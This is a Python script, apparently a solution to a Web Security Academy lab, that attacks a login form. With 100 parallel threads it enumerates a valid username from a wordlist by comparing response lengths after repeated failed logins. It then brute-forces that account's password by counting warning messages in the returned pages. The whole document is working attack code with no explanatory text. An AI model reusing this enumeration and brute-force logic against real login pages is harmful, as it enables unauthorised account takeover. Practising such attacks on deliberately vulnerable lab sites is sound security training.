import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

usernames = open('username.txt', 'r').readlines()
passwords = open('password.txt', 'r').readlines()

url = 'https://ac981f8d1e7663c0c0d9c7e900ae00fc.web-security-academy.net/login'

def get_username(data):
    return (str(data['username']), len(requests.post(url, data=data).text))

def get_password(data):
    res = requests.post(url, data = data)
    soup = BeautifulSoup(res.text, 'html.parser')
    
    return (str(data['password']), len(soup.find_all('p', class_='is-warning')))

with ThreadPoolExecutor(max_workers=100) as pool:
    data = []
    for user in usernames:
        for n in range(1, 6):
            data.append({'username' : user.strip(), 'password' : 'a' + str(n)})
    length = dict(list(pool.map(get_username, data)))
    username = str(max(length, key=length.get))
    print(username)
    data.clear()
    for passwd in passwords:
        data.append({'username' : username, 'password' : passwd.strip()})
    length = dict(list(pool.map(get_password, data)))
    password = str(min(length, key=length.get))
    print(password)